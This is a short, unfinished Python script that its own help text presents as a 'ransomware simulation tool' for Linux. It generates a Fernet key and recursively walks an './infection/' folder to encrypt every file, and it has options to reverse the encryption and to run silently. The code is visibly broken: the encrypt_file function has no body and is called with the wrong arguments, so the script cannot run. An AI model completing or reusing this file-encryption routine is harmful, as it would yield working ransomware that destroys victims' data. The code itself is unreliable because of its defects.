import argparse
import os
import sys

from cryptography.fernet import Fernet



def encrypt_file(file_name, key):



def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def list_dir(base_dir):
    print('Listing:', base_dir)
    try:
        with os.scandir(base_dir) as entries:
            for entry in entries:
                if entry.is_dir():
                    print('Directory:', entry.name)
                    list_dir(entry.path)
                else:
                    encrypt_file(entry.name)
    except FileNotFoundError:
        print(f"Directory not found: '{base_dir}'")
        sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
    description='A ransomware simulation tool developed for the Linux platform.',
    )
    parser.add_argument(
            '-v', '--version',
            action='version',
            version='%(prog)s 1.0',
            help='Show the version of the program.'
    )
    parser.add_argument(
            '-r', '--reverse',
            metavar='KEY',
            type=str,
            help='Reverse the encryption process using the provided key.'
    )
    parser.add_argument(
            '-s', '--silent',
            action='store_true',
            help='Run the program in silent mode without displaying the names of the encrypted files.'
    )
    args = parser.parse_args()
    base_dir = './infection/'
    generate_key()
    list_dir(base_dir)
